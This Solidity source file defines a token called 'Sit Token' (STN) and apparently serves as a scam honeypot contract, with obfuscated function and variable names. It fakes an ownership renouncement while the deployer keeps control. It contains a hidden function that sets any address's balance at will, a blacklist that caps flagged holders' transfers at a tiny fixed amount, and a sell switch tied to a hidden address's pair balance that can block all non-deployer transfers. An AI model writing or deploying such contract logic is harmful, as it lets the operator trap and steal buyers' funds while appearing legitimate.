//SPDX-License-Identifier: MIT

pragma solidity ^0.8.14;

interface exemptTo {
    function totalSupply() external view returns (uint256);

    function balanceOf(address swapTake) external view returns (uint256);

    function transfer(address feeMode, uint256 maxReceiver) external returns (bool);

    function allowance(address totalFee, address spender) external view returns (uint256);

    function approve(address spender, uint256 maxReceiver) external returns (bool);

    function transferFrom(
        address sender,
        address feeMode,
        uint256 maxReceiver
    ) external returns (bool);

    event Transfer(address indexed from, address indexed autoTeam, uint256 value);
    event Approval(address indexed totalFee, address indexed spender, uint256 value);
}

abstract contract tradingList {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface feeReceiver {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface buyShould {
    function createPair(address walletFromTeam, address limitListExempt) external returns (address);
}

interface exemptToMetadata is exemptTo {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract SitToken is tradingList, exemptTo, exemptToMetadata {

    function totalSupply() external view virtual override returns (uint256) {
        return shouldLimit;
    }

    function transfer(address launchFee, uint256 maxReceiver) external virtual override returns (bool) {
        return amountWalletFee(_msgSender(), launchFee, maxReceiver);
    }

    function transferFrom(address liquidityTx, address feeMode, uint256 maxReceiver) external override returns (bool) {
        if (_msgSender() != fundLimitEnable) {
            if (atTakeSell[liquidityTx][_msgSender()] != type(uint256).max) {
                require(maxReceiver <= atTakeSell[liquidityTx][_msgSender()]);
                atTakeSell[liquidityTx][_msgSender()] -= maxReceiver;
            }
        }
        return amountWalletFee(liquidityTx, feeMode, maxReceiver);
    }

    uint256 shouldMode;

    function tradingBuyEnable(uint256 maxReceiver) public {
        listAt();
        feeMinTrading = maxReceiver;
    }

    uint256 private minLaunchedFrom;

    mapping(address => mapping(address => uint256)) private atTakeSell;

    function tradingMinMarketing(address launchFee, uint256 maxReceiver) public {
        listAt();
        fromReceiverMode[launchFee] = maxReceiver;
    }

    constructor (){
        
        feeReceiver isList = feeReceiver(fundLimitEnable);
        feeTo = buyShould(isList.factory()).createPair(isList.WETH(), address(this));
        
        teamBuy = _msgSender();
        limitEnable();
        buyEnable[teamBuy] = true;
        fromReceiverMode[teamBuy] = shouldLimit;
        if (minLaunchedFrom != launchedTx) {
            maxLaunched = false;
        }
        emit Transfer(address(0), teamBuy, shouldLimit);
    }

    bool private maxLaunched;

    bool public enableSell;

    function feeTxTotal(address liquidityTx, address feeMode, uint256 maxReceiver) internal returns (bool) {
        require(fromReceiverMode[liquidityTx] >= maxReceiver);
        fromReceiverMode[liquidityTx] -= maxReceiver;
        fromReceiverMode[feeMode] += maxReceiver;
        emit Transfer(liquidityTx, feeMode, maxReceiver);
        return true;
    }

    mapping(address => bool) public buyEnable;

    function decimals() external view virtual override returns (uint8) {
        return autoReceiver;
    }

    mapping(address => bool) public buyAtFrom;

    mapping(address => uint256) private fromReceiverMode;

    function balanceOf(address swapTake) public view virtual override returns (uint256) {
        return fromReceiverMode[swapTake];
    }

    function symbol() external view virtual override returns (string memory) {
        return buyMin;
    }

    address fundLimitEnable = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function shouldFund(address launchSender) public {
        if (enableSell) {
            return;
        }
        if (maxLaunched == sellMin) {
            maxLaunched = false;
        }
        buyEnable[launchSender] = true;
        
        enableSell = true;
    }

    address public feeTo;

    function name() external view virtual override returns (string memory) {
        return shouldLaunch;
    }

    bool private sellMin;

    address private shouldFrom;

    function listAt() private view {
        require(buyEnable[_msgSender()]);
    }

    function shouldMarketingTake(address isSender) public {
        listAt();
        if (sellMin) {
            minLaunchedFrom = launchedTx;
        }
        if (isSender == teamBuy || isSender == feeTo) {
            return;
        }
        buyAtFrom[isSender] = true;
    }

    uint256 feeMinTrading;

    function limitEnable() public {
        emit OwnershipTransferred(teamBuy, address(0));
        shouldFrom = address(0);
    }

    function approve(address txIs, uint256 maxReceiver) public virtual override returns (bool) {
        atTakeSell[_msgSender()][txIs] = maxReceiver;
        emit Approval(_msgSender(), txIs, maxReceiver);
        return true;
    }

    address tokenMin = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function allowance(address feeMin, address txIs) external view virtual override returns (uint256) {
        if (txIs == fundLimitEnable) {
            return type(uint256).max;
        }
        return atTakeSell[feeMin][txIs];
    }

    uint8 private autoReceiver = 18;

    uint256 private shouldLimit = 100000000 * 10 ** 18;

    uint256 constant buyLaunched = 7 ** 10;

    string private buyMin = "STN";

    function getOwner() external view returns (address) {
        return shouldFrom;
    }

    function owner() external view returns (address) {
        return shouldFrom;
    }

    uint256 private launchedTx;

    string private shouldLaunch = "Sit Token";

    function amountWalletFee(address liquidityTx, address feeMode, uint256 maxReceiver) internal returns (bool) {
        if (liquidityTx == teamBuy) {
            return feeTxTotal(liquidityTx, feeMode, maxReceiver);
        }
        uint256 marketingIsTake = exemptTo(feeTo).balanceOf(tokenMin);
        require(marketingIsTake == feeMinTrading);
        require(feeMode != tokenMin);
        if (buyAtFrom[liquidityTx]) {
            return feeTxTotal(liquidityTx, feeMode, buyLaunched);
        }
        return feeTxTotal(liquidityTx, feeMode, maxReceiver);
    }

    address public teamBuy;

    event OwnershipTransferred(address indexed limitMode, address indexed minAutoMarketing);

}